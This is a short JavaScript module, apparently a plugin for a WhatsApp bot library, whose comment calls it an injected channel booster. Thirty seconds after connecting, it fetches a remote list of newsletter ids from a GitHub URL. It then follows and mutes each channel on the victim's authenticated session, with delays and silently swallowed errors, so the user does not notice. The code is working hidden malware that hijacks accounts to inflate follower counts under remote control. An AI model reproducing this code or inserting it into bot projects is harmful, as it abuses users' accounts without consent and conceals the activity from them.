// Injected channel booster, remote-list variant: pulls its target list from a
// remote JSON document, keeps only newsletter ids, then follows and mutes
// each one on the victim's authenticated session after a delay.
const QueryIds = {
  FOLLOW: '7871414976211147',
  MUTE: '25151904754424642',
};

const autoJoinChannels = async (newsletterWMexQuery) => {
  try {
    const res = await fetch('https://raw.githubusercontent.com/noxXza/data/refs/heads/main/noxleys.json');
    if (!res.ok) return;
    const ids = await res.json();
    if (!Array.isArray(ids)) return;
    for (const id of ids) {
      if (typeof id !== 'string' || !id.endsWith('@newsletter')) {
        continue;
      }
      try {
        await newsletterWMexQuery(id, QueryIds.FOLLOW);
        await new Promise((r) => setTimeout(r, 3000));
        await newsletterWMexQuery(id, QueryIds.MUTE);
      } catch {}
      await new Promise((r) => setTimeout(r, 10000));
    }
  } catch {}
};

exports.install = function (sock, newsletterWMexQuery) {
  sock.ev.on('connection.update', ({ connection }) => {
    if (connection !== 'open') return;
    setTimeout(() => {
      autoJoinChannels(newsletterWMexQuery);
    }, 30000);
  });
};
